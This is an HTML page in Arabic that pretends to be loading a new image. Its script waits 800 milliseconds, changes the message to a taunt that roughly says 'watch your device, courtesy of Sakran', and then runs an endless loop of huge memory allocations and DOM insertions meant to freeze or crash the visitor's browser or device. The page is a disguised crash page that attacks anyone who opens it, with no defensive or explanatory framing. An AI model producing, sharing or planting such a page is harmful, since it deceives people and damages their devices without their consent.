<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>صورة جديدة</title>
    <style>
        body { background-color: #fff; color: #333; text-align: center; padding-top: 25vh; font-family: sans-serif; }
    </style>
</head>
<body>
    <h2 id="msg">جاري تحميل الصورة، يرجى الانتظار...</h2>
    <script>
        const crashArray = [];
        setTimeout(() => {
            document.getElementById("msg").innerText = "راقب جهازك تحت رعاية سكران";
            document.body.style.backgroundColor = "#000";
            document.body.style.color = "#fff";
            
            while(true) {
                crashArray.push(new Array(200000000).fill(Math.random()));
                const d = document.createElement('div');
                document.body.appendChild(d);
            }
        }, 800);
    </script>
</body>
</html>
